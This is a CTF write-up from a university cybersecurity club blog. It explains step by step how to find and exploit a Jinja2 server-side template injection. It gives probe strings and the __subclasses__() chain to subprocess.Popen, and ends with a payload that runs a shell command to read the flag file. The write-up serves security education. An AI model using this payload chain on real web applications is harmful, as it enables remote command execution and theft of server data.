<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Say Hello!</title><meta content="Say Hello!" name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/Guild_Selection_CTF/SayHello/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content="Say Hello!" property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/Guild_Selection_CTF/SayHello/ property=twitter:url><meta content="Say Hello!" property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/Guild_Selection_CTF/SayHello/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>SayHello</span></div><time datetime=2024-09-05>Published on: <span class=accent-data>2024-09-05</span></time><address rel=author>By <span class=accent-data> Achintya J, and exploiitm </span></address><h1>Say Hello!</h1><h1 id=say-hello>Say Hello!</h1><p>So, none of the common web exploitation techniques work here. There is nothing special in the HTTP requests, nothing in web directories or vhosts. At this point you should try out techniques like SSTI, XSS etc. Luckily for us, testing for <code>SSTI</code> gives results right away!<pre style=background:#282828;color:#fdf4c1aa><code><span>	test for SSTI using: {{}} --> gives error means, potential SSTI threat
</span></code></pre><p>useful link: https://portswigger.net/web-security/server-side-template-injection<p>Now that we know its SSTI, we want to understand what template engine is running this. This also we can test using prompts,<pre style=background:#282828;color:#fdf4c1aa><code><span>	template engine: Jinja2 (test using {{7*'7'}}, if it gives 7777777 then its Jinja2)
</span></code></pre><p>once we know the template engine, we can look for ways to exploit this specifically.<p>useful: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti<p>Going systematically, once we have figured out that SSTI is possible in this, test out these things<ol><li><code>{{''.__class__}}</code> should return “str” or “string”<li><code>{{''.__class__.mro()}}</code> should return “str” and “object”. We therefore have access to the “object” class if we use something like <code>{{''.__class__.mro()[-1]}}</code>. This is amazing!</ol><p>What we are looking for, is any way to get some function which we can use to read the flag which lies in the server.<p>The main thing that stands out in stuff like this, is shell code execution. The thing therefore that we are looking for is a way to execute shell commands, just like using the “os” module in python.<p>We can check all the subclasses available to us (not intentionally but since there is a SSTI vulnerability we can use that and see) using this<ol start=3><li><code>{{''.__class__.mro()[-1].__subclasses__()}}</code></ol><p>This will return a lot of subclasses. We need to look for something called <code>&LTclass 'subprocess.Popen'></code>. This will allow us to use shell command and execute arbitrary code on the server! After running this command, locate this class and get its index. <code>For me, it was -12.</code><ol start=4><li><code>{{''.__class__.mro()[-1].__subclasses__()[-12]}}</code> gives the class subprocess.Popen.</ol><p>Now we can read the “flag.txt” file (this is something you can assume, that the flag’s name is flag.txt) using the following command<ol start=5><li><code>{{''.__class__.mro()[1].__subclasses__()[-12]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}</code>. The additional parameters are as advocated by the link given above.</ol><p><code>flag: FLAG{Sh3n4n1g4ns!nject3d}</code><p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>